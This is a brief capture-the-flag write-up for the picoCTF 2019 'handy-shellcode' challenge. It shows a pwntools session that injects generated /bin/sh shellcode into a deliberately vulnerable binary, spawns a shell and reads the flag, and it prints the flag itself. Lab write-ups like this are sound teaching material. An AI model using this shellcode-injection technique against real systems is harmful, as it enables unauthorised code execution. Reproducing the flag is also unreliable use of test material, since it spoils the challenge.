<center><h1>Binary</h1></center>
<br><br>
<center><h2>handy-shellcode [50]</h2></center>
<br>
Q: This *[program](/picoctf2019/files/handyShellcodeVuln)* executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5 on the shell server. *[Source](/picoctf2019/files/handyShellcodeVuln.c)*.

A: It tells us exactly what to do. Easiest way to spawn a shell would be to use pwn tools with python. Log into the shell server and navigate to ```/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5``` which is where the ```vuln``` binary and ```flag.txt``` are stored. Here we are going to spawn our shell. Using the 4 lines of python code below we are able to grab the flag.
```
$ cd /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5
/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5$ python
>>> from pwn import *
>>> sh = process('./vuln')
[x] Starting local process './vuln'
[+] Starting local process './vuln': pid 2276666
>>> sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
'Enter your shellcode'
>>> sh.interactive()
[*] Switching to interactive mode
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
Thanks! Executing now...

cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}
```
Flag:```picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}```
<br>
